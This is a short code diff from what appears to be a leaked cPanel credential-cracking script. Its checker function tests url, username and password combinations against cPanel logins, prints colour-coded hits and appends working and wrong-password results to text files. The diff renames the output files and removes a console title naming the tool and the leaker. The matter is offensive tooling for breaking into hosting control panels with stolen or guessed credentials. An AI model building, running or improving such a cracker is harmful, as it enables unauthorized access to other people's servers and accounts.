@@ -83,14 +83,14 @@ def checker(line):
             WORK +=1
             TOTAL +=1
 
-            save = open('Result/Work Cpanels.txt','a')
+            save = open('Cpanels.txt','a')
             save.write(result)
             save.close()
         if 'invalid_login' in r:
             print(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX}FOUND CPANEL BUT WRONG PASSWORD")
             WRONG +=1
             TOTAL +=1
-            save = open('Result/Cpanels WrongPassword.txt','a')
+            save = open('WrongPassword.txt','a')
             save.write(result)
             save.close()
     except:
@@ -106,7 +106,6 @@ def main():
         os.system('cls')
     else:os.system('clear')
     os.system('mode con:cols=130 lines=30')
-    ctypes.windll.kernel32.SetConsoleTitleW('Cpanel Cracker Leaked By : @xploitpriv')
     x = f'''                                                                                                                                                                                                                        
 {Fore.LIGHTBLUE_EX}   ____                                        ___          ____                            ___                      
 {Fore.LIGHTCYAN_EX}  6MMMMb/                                      `MM         6MMMMb/                          `MM                      
